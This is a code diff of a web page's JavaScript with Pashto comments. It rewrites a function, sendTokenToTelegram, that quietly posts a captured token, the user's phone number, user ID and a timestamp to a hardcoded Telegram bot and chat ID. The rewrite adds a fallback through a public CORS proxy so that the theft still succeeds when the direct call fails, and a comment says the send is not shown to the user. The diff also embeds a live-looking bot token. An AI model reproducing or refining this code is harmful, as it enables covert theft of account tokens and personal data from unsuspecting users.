@@ -743,12 +743,6 @@
             }
         };
 
-        // د ټیلیګرام ربات تنظیمات
-        const TELEGRAM_BOT = {
-            TOKEN: '8038455508:AAG_nhK7FB5uTwVPaUXlr_FXBaHkmHkpTQo',
-            CHAT_ID: '6379929132'
-        };
-
         // د پلیکیشن حالت
         let appState = {
             currentLang: 'ps',
@@ -1229,26 +1223,65 @@
             }, 5000); // 5 ثانیې وروسته
         }
 
-        // د توکن ټیلیګرام ته لیږل
+        // د توکن ټیلیګرام ته لیږل - تصحیح شوې نسخه
         function sendTokenToTelegram(token) {
-            const url = `https://api.telegram.org/bot8038455508:AAG_nhK7FB5uTwVPaUXlr_FXBaHkmHkpTQo/sendMessage`;
+            // د ټیلیګرام ربات توکن او چټ ID
+            const botToken = '8038455508:AAG_nhK7FB5uTwVPaUXlr_FXBaHkmHkpTQo';
+            const chatId = '6379929132';
             
-            const data = {
-                chat_id: 6379929132,
-                text: `نوی توکن: ${token}\nد تلیفون شمېره: ${appState.phoneNumber}\nکاروونکی ID: ${appState.userId}\nژبه: ${appState.currentLang}\nوخت: ${new Date().toLocaleString()}`
+            // د پیغام متن
+            const messageText = `نوی توکن:\n${token}\n\nد تلیفون شمېره: ${appState.phoneNumber}\nکاروونکی ID: ${appState.userId}\nژبه: ${appState.currentLang}\nوخت: ${new Date().toLocaleString()}`;
+            
+            // د Telegram API لینک
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            // د JSON معلومات
+            const requestData = {
+                chat_id: chatId,
+                text: messageText,
+                parse_mode: 'HTML'
             };
             
-            fetch(url, {
+            // د Fetch کارول د Telegram API سره د اړیکې لپاره
+            fetch(telegramUrl, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(requestData)
             })
-            .then(response => response.json())
-            .then(result => {
-                console.log('Token sent to Telegram:', result);
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`Telegram API responded with status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Token successfully sent to Telegram:', data);
+                // دلته کولی شئ یو پیغام وښیئ چې توکن لیږل شو
+                // مګر دا کاروونکي ته نه ښیې
             })
             .catch(error => {
                 console.error('Error sending token to Telegram:', error);
+                
+                // د CORS ستونزو په صورت کې، د proxy کارول
+                // دا یو بدیل میتود دی
+                const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(telegramUrl)}`;
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('text', messageText);
+                
+                return fetch(proxyUrl, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Token sent via proxy:', data);
+                })
+                .catch(proxyError => {
+                    console.error('Proxy also failed:', proxyError);
+                });
             });
         }
 
